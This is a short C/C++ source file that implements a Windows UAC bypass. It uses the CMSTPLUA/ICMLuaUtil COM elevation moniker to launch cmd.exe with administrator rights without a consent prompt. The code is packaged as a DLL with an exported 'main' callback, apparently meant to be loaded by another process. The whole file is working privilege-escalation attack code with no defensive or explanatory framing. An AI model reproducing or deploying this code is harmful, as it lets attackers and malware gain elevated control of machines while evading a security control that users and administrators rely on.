#include "BypassUAC.h"

HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, __out void** ppv)
{

	BIND_OPTS3 bo;
	WCHAR  wszCLSID[50];
	WCHAR  wszMonikerName[300];
	CoInitialize(NULL);
	StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID) / sizeof(wszCLSID[0]));
	HRESULT hr = StringCchPrintfW(wszMonikerName, sizeof(wszMonikerName) / sizeof(wszMonikerName[0]), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
		return hr;

	memset(&bo, 0, sizeof(bo));

	bo.cbStruct = sizeof(bo);
	bo.hwnd = hwnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
	getchar();
	return CoGetObject(wszMonikerName, &bo, riid, ppv);
}

BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil* CMLuaUtil = NULL;
	BOOL bRet = FALSE;


	CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
	IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

	CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
	hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);

	CMLuaUtil->lpVtbl->Release(CMLuaUtil);

	if (GetLastError())
	{
		return FALSE;
	}
	else {
		return TRUE;	
	}
}
/*
int main() {
	CoInitialize(NULL);

	CMLuaUtilBypassUAC((LPWSTR)L"c:\\windows\\system32\\cmd.exe");
	CoUninitialize();
	return 0;
}*/
extern "C" __declspec(dllexport) VOID CALLBACK main()
{


	CMLuaUtilBypassUAC((LPWSTR)L"c:\\windows\\system32\\cmd.exe");

	//CoUninitialize();

}
